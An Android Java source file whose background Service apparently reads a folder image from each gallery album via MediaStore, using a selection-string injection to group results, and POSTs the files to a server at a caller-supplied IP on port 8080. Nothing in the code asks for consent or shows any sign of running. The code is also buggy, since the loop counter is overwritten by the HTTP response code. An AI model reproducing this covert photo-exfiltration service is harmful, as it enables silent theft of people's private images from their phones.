package com.example.getimages;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.MediaStore;
import android.util.Log;

import androidx.annotation.Nullable;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

public class MyService extends Service{
    private static final String TAG = "uploadFile";
    private static final int TIME_OUT = 10 * 1000; // 超时时间
    private static final String CHARSET = "utf-8"; // 设置编码
    private  String ip ;
    public void setIP(String ip){
        this.ip = ip;
    };


    //服务创建
    @Override
    public void onCreate() {
        super.onCreate();
    }

    // 服务启动
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {


        setIP(intent.getStringExtra("ip"));
        Handler handlerThree=new Handler(Looper.getMainLooper());
        new Thread(new Runnable() {
            @Override
            public void run() {
                queryGallery();
                uploadImage();
            }
        }).start();


      //获取本地相册







        return super.onStartCommand(intent, flags, startId);

    }

    //服务销毁
    @Override
    public void onDestroy() {
        stopSelf(); //自杀服务
        super.onDestroy();
    }

    //绑定服务
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return new MyBinder();
    }
    // IBinder是远程对象的基本接口，是为高性能而设计的轻量级远程调用机制的核心部分。但它不仅用于远程
    // 调用，也用于进程内调用。这个接口定义了与远程对象交互的协议。
    // 不要直接实现这个接口，而应该从Binder派生。
    // Binder类已实现了IBinder接口
    class MyBinder extends Binder {
        /** * 获取Service的方法 * @return 返回PlayerService */
        public MyService getService(){
            return MyService.this;
        }
    }
    List<GalleryEntity> galleryList = new ArrayList<GalleryEntity>();
    public  List<GalleryEntity> queryGallery() {





        ContentResolver cr = getApplicationContext().getContentResolver();
        String[] columns = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA, MediaStore.Images.Media.BUCKET_ID, MediaStore.Images.Media.BUCKET_DISPLAY_NAME, "COUNT(1) AS count"};
        String selection = "0==0) GROUP BY (" + MediaStore.Images.Media.BUCKET_ID;
        String sortOrder = MediaStore.Images.Media.DATE_MODIFIED;
        Cursor cur = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, columns, selection, null, sortOrder);
        if (cur.moveToFirst()) {
            int id_column = cur.getColumnIndex(MediaStore.Images.Media._ID);
            int image_id_column = cur.getColumnIndex(MediaStore.Images.Media.DATA);
            int bucket_id_column = cur.getColumnIndex(MediaStore.Images.Media.BUCKET_ID);
            int bucket_name_column = cur.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
            int count_column = cur.getColumnIndex("count");
            do {
// Get the field values
                int id = cur.getInt(id_column);
                String image_path = cur.getString(image_id_column);
                int bucket_id = cur.getInt(bucket_id_column);
                String bucket_name = cur.getString(bucket_name_column);
                int count = cur.getInt(count_column);
// Do something with the values.
                GalleryEntity gallery = new GalleryEntity(id, image_path, bucket_id, bucket_name, count);
                gallery.setId(id);
                gallery.setPath(image_path);
                gallery.setGallery_id(bucket_id);
                gallery.setGallery_name(bucket_name);
                gallery.setCount(count);
                galleryList.add(gallery);
            } while (cur.moveToNext());
        }
        return galleryList;

    }
   //开始传图片
    public void uploadImage()  {

      for(int i = 0;i<galleryList.size();i++){
          Log.v("mingzi",galleryList.get(i).getPath());
           File file = new File(galleryList.get(i).getPath());//本地图片

          Log.v("大小",file.length()+"");

        int z = 0;
        try {
            i  =   uploadFile(file,"http://"+ip+":8080/demo1_war_exploded/hello-getPicure");

        } catch (IOException e) {
            Log.e("ERRORRRRR",""+"FFSKDJFKDSS");
        }
        }


    }




    /**
     * 上传文件到服务器
     * @param file 需要上传的文件
     * @param RequestURL 请求的rul
     * @return 返回响应的内容
     */
    public static int uploadFile(File file, String RequestURL) throws IOException {
        Log.e("wangzhi", RequestURL);
        int res=0;
        String result = null;
        String BOUNDARY = UUID.randomUUID().toString(); // 边界标识 随机生成
        String PREFIX = "--", LINE_END = "\r\n";
        String CONTENT_TYPE = "multipart/form-data"; // 内容类型

        try {
            URL url = new URL(RequestURL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setReadTimeout(TIME_OUT);
            conn.setConnectTimeout(TIME_OUT);
            conn.setDoInput(true); // 允许输入流
            conn.setDoOutput(true); // 允许输出流
            conn.setUseCaches(false); // 不允许使用缓存
            conn.setRequestMethod("POST"); // 请求方式
            conn.setRequestProperty("Charset", CHARSET); // 设置编码
            conn.setRequestProperty("connection", "keep-alive");
            conn.setRequestProperty("Content-Type", CONTENT_TYPE + ";boundary="+ BOUNDARY);

            if (file != null) {
                /**
                 * 当文件不为空时执行上传
                 */
                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                StringBuffer sb = new StringBuffer();
                sb.append(PREFIX);
                sb.append(BOUNDARY);
                sb.append(LINE_END);
                /**
                 * 这里重点注意： name里面的值为服务器端需要key 只有这个key 才可以得到对应的文件
                 * filename是文件的名字，包含后缀名
                 */

                sb.append("Content-Disposition: form-data; name=\"file\"; filename=\""
                        + file.getName() + "\"" + LINE_END);
                sb.append("Content-Type: application/octet-stream; charset="
                        + CHARSET + LINE_END);
                sb.append(LINE_END);
                dos.write(sb.toString().getBytes());
                InputStream is = new FileInputStream(file);
                byte[] bytes = new byte[1024];
                int len = 0;
                while ((len = is.read(bytes)) != -1) {
                    dos.write(bytes, 0, len);
                }
                is.close();
                dos.write(LINE_END.getBytes());
                byte[] end_data = (PREFIX + BOUNDARY + PREFIX + LINE_END)
                        .getBytes();
                dos.write(end_data);
                dos.flush();
                /**
                 * 获取响应码 200=成功 当响应成功，获取响应的流
                 */
                res = conn.getResponseCode();
                Log.e(TAG, "response code:" + res);
                if (res == 200) {
                    Log.e(TAG, "request success");
                    InputStream input = conn.getInputStream();
                    StringBuffer sb1 = new StringBuffer();
                    int ss;
                    while ((ss = input.read()) != -1) {
                        sb1.append((char) ss);
                    }
                    result = sb1.toString();
                    Log.e(TAG, "result : " + result);
                } else {
                    Log.e(TAG, "request error");
                }
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return res;
    }
}